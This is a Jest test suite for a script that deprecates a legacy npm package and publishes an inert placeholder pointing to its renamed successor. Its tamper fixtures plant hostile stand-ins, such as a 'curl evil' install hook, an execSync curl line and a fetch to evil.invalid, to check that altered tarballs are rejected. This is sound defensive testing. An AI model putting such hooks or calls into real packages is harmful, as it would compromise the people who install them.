// SPDX-License-Identifier: Apache-2.0
// ABOUTME: Legacy npm follow-ups cannot precede the real release or overwrite an unrelated package.
// ABOUTME: Local command doubles and real tar fixtures verify the inert placeholder without publishing.
import { execFileSync } from 'node:child_process';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { parse } from 'yaml';
import { requiresPrivateEvidence } from '../helpers/public-mirror';

const {
  placeholderFiles,
  verifyTarball,
  runPhase,
  readResult,
  npmEnvironment,
} = require('../../scripts/finalize-reasonbook-npm');
const root = path.resolve(__dirname, '../..');
const PRIVATE = requiresPrivateEvidence({
  reason: 'the npm mutation workflow is private',
  paths: { workflow: '.github/workflows/finalize-reasonbook-npm.yml' },
});
let scratch: string;
beforeEach(() => {
  scratch = fs.mkdtempSync(path.join(os.tmpdir(), 'reasonbook-npm-followup-'));
});
afterEach(() => {
  fs.rmSync(scratch, { recursive: true, force: true });
});
const ok = (data: unknown) => ({ status: 0, stdout: JSON.stringify(data), stderr: '' });
const absent = { status: 1, stdout: JSON.stringify({ error: { code: 'E404' } }), stderr: '' };
const release = { name: '@aquex/reasonbook', version: '4.0.0', mcpName: 'ai.aquex/reasonbook' };
const legacyVersion = { name: '@aquex/cmos-mcp', version: '3.5.0' };
const deprecation =
  'CMOS is now Reasonbook. Use @aquex/reasonbook. Migration: https://github.com/kneelinghorse/reasonbook/blob/main/docs/migrating-from-cmos.md';
// npm view package@* returns latest metadata with a version list, not one object per version.
function legacyRead(
  args: string[],
  records: Array<{ name: string; version: string; deprecated?: string }> = [legacyVersion]
) {
  if (args[1] === legacyVersion.name || args[1] === `${legacyVersion.name}@*`)
    return ok({
      ...legacyVersion,
      deprecated: records.find((entry) => entry.version === legacyVersion.version)?.deprecated,
      versions: records.map((entry) => entry.version),
    });
  return ok(records.find((entry) => args[1] === `${legacyVersion.name}@${entry.version}`));
}
function localRoot(version = '4.0.0'): string {
  const dir = path.join(scratch, 'repo');
  fs.mkdirSync(dir);
  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ ...release, version }));
  fs.copyFileSync(path.join(root, 'LICENSE'), path.join(dir, 'LICENSE'));
  return dir;
}
function tarball(files: Record<string, string>): string {
  const base = fs.mkdtempSync(path.join(scratch, 'tar-'));
  fs.mkdirSync(path.join(base, 'package'));
  for (const [name, content] of Object.entries(files))
    fs.writeFileSync(path.join(base, 'package', name), content);
  const file = path.join(base, 'cmos-mcp-1.0.0.tgz');
  execFileSync(
    'tar',
    ['-czf', file, '-C', base, ...Object.keys(files).map((name) => `package/${name}`)],
    { env: { ...process.env, COPYFILE_DISABLE: '1' } }
  );
  return file;
}
test('refuses unpublished, mismatched and prerelease target versions before any mutation', () => {
  const dir = localRoot();
  for (const value of [
    absent,
    ok({ ...release, version: '3.5.0' }),
    ok({ ...release, name: '@other/package' }),
  ]) {
    const runNpm = jest.fn(() => value);
    expect(() => runPhase('deprecate', { root: dir, scratch, runNpm })).toThrow();
    expect(runNpm.mock.calls).toHaveLength(1);
  }
  fs.writeFileSync(
    path.join(dir, 'package.json'),
    JSON.stringify({ ...release, version: '4.0.0-rc.1' })
  );
  const runNpm = jest.fn();
  expect(() => runPhase('publish', { root: dir, scratch, runNpm })).toThrow(/stable/);
  expect(runNpm).not.toHaveBeenCalled();
});
test('only structured E404 means absent; auth, network and malformed replies fail closed', () => {
  expect(readResult(absent, true)).toBeNull();
  for (const code of ['E401', 'E403', 'ENOTFOUND'])
    expect(() =>
      readResult({ ...absent, stdout: JSON.stringify({ error: { code } }) }, true)
    ).toThrow();
  expect(() => readResult({ status: 1, stdout: '', stderr: 'E404 maybe' }, true)).toThrow();
  expect(() => readResult(absent, false)).toThrow();
});
test('read operations never inherit publish credentials', () => {
  const env = { PATH: '/bin', NODE_AUTH_TOKEN: 'secret', NPM_TOKEN: 'secret' };
  expect(npmEnvironment(env, false)).toEqual({ PATH: '/bin' });
  expect(npmEnvironment(env, true)).toEqual(env);
});
test('placeholder has no dependencies or lifecycle scripts and its bin only prints the pinned move', () => {
  const files = placeholderFiles(root);
  expect(Object.keys(files).sort()).toEqual(['LICENSE', 'README.md', 'bin.js', 'package.json']);
  const pkg = JSON.parse(files['package.json']);
  expect(pkg).toMatchObject({ name: 'cmos-mcp', version: '1.0.0', bin: { 'cmos-mcp': 'bin.js' } });
  expect(pkg.scripts).toBeUndefined();
  expect(pkg.dependencies).toBeUndefined();
  expect(files['bin.js']).not.toMatch(/require|import|fetch|exec|spawn/);
  const bin = path.join(scratch, 'bin.js');
  fs.writeFileSync(bin, files['bin.js']);
  expect(execFileSync(process.execPath, [bin], { encoding: 'utf8' })).toContain(
    'npx --prefer-offline -y @aquex/reasonbook@4.0.0'
  );
});
test('exact tar contents reject executable substitution, extra files, and altered package metadata', () => {
  const files = placeholderFiles(root);
  expect(() => verifyTarball(tarball(files), files)).not.toThrow();
  for (const altered of [
    { ...files, 'bin.js': 'require("child_process").execSync("curl evil");' },
    { ...files, 'extra.js': 'unexpected' },
    {
      ...files,
      'package.json': JSON.stringify({
        ...JSON.parse(files['package.json']),
        scripts: { install: 'curl evil' },
      }),
    },
  ]) {
    expect(() => verifyTarball(tarball(altered), files)).toThrow();
  }
});
test('the exact verifier accepts an actual offline npm pack without lifecycle execution', () => {
  const files: Record<string, string> = placeholderFiles(root);
  const dir = path.join(scratch, 'package');
  fs.mkdirSync(dir);
  for (const [name, content] of Object.entries(files))
    fs.writeFileSync(path.join(dir, name), content);
  const userconfig = path.join(scratch, 'npmrc');
  fs.writeFileSync(userconfig, '');
  const packed = JSON.parse(
    execFileSync(
      'npm',
      [
        'pack',
        '--offline',
        '--ignore-scripts',
        '--json',
        '--userconfig',
        userconfig,
        '--cache',
        path.join(scratch, 'cache'),
        '--pack-destination',
        scratch,
      ],
      { cwd: dir, encoding: 'utf8', env: npmEnvironment(process.env, false) }
    )
  );
  expect(() => verifyTarball(path.join(scratch, packed[0].filename), files)).not.toThrow();
});
test('metadata collisions and an unexpected maintainer block even deprecation', () => {
  const dir = localRoot();
  for (const candidate of [
    {
      name: 'cmos-mcp',
      version: '9.0.0',
      versions: ['9.0.0'],
      maintainers: [{ name: 'kneelinghorse' }],
    },
    { name: 'cmos-mcp', version: '1.0.0', versions: ['1.0.0'], maintainers: [{ name: 'other' }] },
  ]) {
    const runNpm = jest.fn().mockReturnValueOnce(ok(release)).mockReturnValueOnce(ok(candidate));
    expect(() => runPhase('deprecate', { root: dir, scratch, runNpm })).toThrow(/collision/);
    expect(runNpm.mock.calls).toHaveLength(2);
  }
});
test('an existing exact placeholder verifies without publishing again', () => {
  const dir = localRoot();
  const archive = tarball(placeholderFiles(dir));
  const runNpm = jest.fn((args: string[], options: { cwd?: string; mutation?: boolean }) => {
    expect(options.mutation).toBe(false);
    if (args[0] === 'pack') {
      fs.copyFileSync(
        archive,
        path.join(args[args.indexOf('--pack-destination') + 1], 'cmos-mcp-1.0.0.tgz')
      );
      return ok([{ filename: 'cmos-mcp-1.0.0.tgz' }]);
    }
    return ok(
      args[1] === '@aquex/reasonbook@4.0.0'
        ? release
        : {
            name: 'cmos-mcp',
            version: '1.0.0',
            versions: ['1.0.0'],
            maintainers: [{ name: 'kneelinghorse' }],
          }
    );
  });
  expect(runPhase('publish', { root: dir, scratch, runNpm })).toEqual({
    placeholder: 'verified-existing',
  });
});
test('new publication requires the prepared exact bytes and uses only fixed targets', () => {
  const dir = localRoot();
  const runNpm = jest.fn((args: string[]) => {
    if (args[0] !== 'view') return ok({});
    if (args[1] === '@aquex/reasonbook@4.0.0') return ok(release);
    if (args[1] === 'cmos-mcp') return absent;
    return legacyRead(args);
  });
  runPhase('prepare', { root: dir, scratch, runNpm });
  runPhase('deprecate', { root: dir, scratch, runNpm });
  runPhase('publish', { root: dir, scratch, runNpm });
  const writes = runNpm.mock.calls
    .filter((call: any[]) => call[1].mutation)
    .map((call: any[]) => call[0]);
  expect(writes).toHaveLength(2);
  expect(writes[0].slice(0, 2)).toEqual(['deprecate', '@aquex/cmos-mcp@*']);
  expect(writes[1]).toEqual([
    'publish',
    path.join(scratch, 'placeholder'),
    '--ignore-scripts',
    '--access',
    'public',
    '--tag',
    'latest',
    '--provenance=false',
    '--json',
  ]);
  expect(writes[0][writes[0].length - 1]).toBe('--json');
  fs.appendFileSync(path.join(scratch, 'placeholder', 'bin.js'), '\nfetch("https://evil.invalid")');
  expect(() => runPhase('publish', { root: dir, scratch, runNpm })).toThrow(/contents/);
});
test.each([
  {
    name: 'registry refusal',
    result: {
      status: 1,
      stdout: JSON.stringify({
        error: { code: 'E403', summary: 'SECRET_SUMMARY', detail: 'SECRET_DETAIL' },
        config: 'SECRET_CONFIG',
      }),
      stderr: 'SECRET_STDERR',
    },
    expected: { npmCode: 'E403', status: 1, signal: null, spawnCode: null },
  },
  {
    name: 'timeout with non-JSON output',
    result: {
      status: null,
      stdout: 'SECRET_STDOUT',
      stderr: 'SECRET_STDERR',
      signal: 'SIGTERM',
      error: { code: 'ETIMEDOUT', message: 'SECRET_ERROR_MESSAGE' },
    },
    expected: { npmCode: null, status: null, signal: 'SIGTERM', spawnCode: 'ETIMEDOUT' },
  },
  {
    name: 'unrecognized but code-shaped strings',
    result: {
      status: 1,
      stdout: JSON.stringify({ error: { code: 'ESECRET' } }),
      stderr: 'SECRET_STDERR',
      signal: 'SIGSECRET',
      error: { code: 'ESECRET', message: 'SECRET_ERROR_MESSAGE' },
    },
    expected: { npmCode: null, status: 1, signal: null, spawnCode: null },
  },
  {
    name: 'malformed diagnostic fields',
    result: {
      status: 'SECRET_STATUS',
      stdout: JSON.stringify({ error: { code: ['E403', 'SECRET_CODE'] } }),
      stderr: 'SECRET_STDERR',
      signal: 'SIGTERM\nSECRET_SIGNAL',
      error: { code: 'ENOENT\nSECRET_CODE' },
    },
    expected: { npmCode: null, status: null, signal: null, spawnCode: null },
  },
])('mutation diagnostics retain only safe fields: $name', ({ result, expected }) => {
  const dir = localRoot();
  const runNpm = jest.fn((args: string[]) => {
    if (args[0] !== 'view') return result;
    if (args[1] === '@aquex/reasonbook@4.0.0') return ok(release);
    if (args[1] === 'cmos-mcp') return absent;
    return legacyRead(args);
  });
  runPhase('prepare', { root: dir, scratch, runNpm });
  for (const phase of ['publish', 'deprecate']) {
    let failure: unknown;
    try {
      runPhase(phase, { root: dir, scratch, runNpm });
    } catch (error) {
      failure = error;
    }
    expect(failure).toBeInstanceOf(Error);
    expect((failure as Error).message).toBe(
      `npm ${phase} failed (${JSON.stringify(expected)}); no success claimed. Retry verifies the registry again.`
    );
    expect(runNpm.mock.calls[runNpm.mock.calls.length - 1][0]).toContain('--json');
  }
});
test('final readback refuses an undeclared legacy version instead of claiming all versions deprecated', () => {
  const dir = localRoot();
  const archive = tarball(placeholderFiles(dir));
  let deprecated: string | undefined = undefined;
  const runNpm = jest.fn((args: string[], options: { mutation: boolean }) => {
    expect(options.mutation).toBe(false);
    if (args[0] === 'pack') {
      fs.copyFileSync(
        archive,
        path.join(args[args.indexOf('--pack-destination') + 1], 'cmos-mcp-1.0.0.tgz')
      );
      return ok([{ filename: 'cmos-mcp-1.0.0.tgz' }]);
    }
    if (args[1] === '@aquex/reasonbook@4.0.0') return ok(release);
    if (args[1] === 'cmos-mcp')
      return ok({
        name: 'cmos-mcp',
        version: '1.0.0',
        versions: ['1.0.0'],
        maintainers: [{ name: 'kneelinghorse' }],
      });
    return legacyRead(args, [
      { ...legacyVersion, version: '3.3.0-rc.1', deprecated },
      { ...legacyVersion, deprecated: deprecation },
    ]);
  });
  expect(() => runPhase('verify', { root: dir, scratch, runNpm })).toThrow(/missing deprecation/);
  deprecated = deprecation;
  expect(runPhase('verify', { root: dir, scratch, runNpm })).toMatchObject({
    placeholder: 'verified-existing',
    deprecatedVersions: 2,
  });
});
PRIVATE.describe('private follow-up workflow', () => {
  test('has no inputs, grants only contents read, serializes runs and exposes the token only to mutations', () => {
    const workflow = parse(fs.readFileSync(PRIVATE.paths.workflow, 'utf8'));
    expect(workflow.on).toEqual({ workflow_dispatch: null });
    expect(workflow.permissions).toEqual({ contents: 'read' });
    expect(workflow.concurrency).toEqual({
      group: 'finalize-reasonbook-npm',
      'cancel-in-progress': false,
    });
    expect(workflow.env).toBeUndefined();
    const job = workflow.jobs.finalize;
    expect(job.env).toBeUndefined();
    expect(job.if).toContain("github.repository == 'kneelinghorse/reasonbook-pro'");
    expect(job.if).toContain("github.ref == 'refs/heads/main'");
    const mutationSteps = job.steps.filter((step: any) => step.env?.NODE_AUTH_TOKEN);
    expect(mutationSteps.map((step: any) => step.run)).toEqual([
      'node scripts/finalize-reasonbook-npm.js deprecate',
      'node scripts/finalize-reasonbook-npm.js publish',
    ]);
    expect(
      mutationSteps.every((step: any) => step.env.NODE_AUTH_TOKEN === '${{ secrets.NPM_TOKEN }}')
    ).toBe(true);
    expect(job.steps.map((step: any) => step.run).filter(Boolean)).toEqual([
      'node scripts/finalize-reasonbook-npm.js prepare',
      'node scripts/finalize-reasonbook-npm.js deprecate',
      'node scripts/finalize-reasonbook-npm.js publish',
      'node scripts/finalize-reasonbook-npm.js verify',
    ]);
  });
});
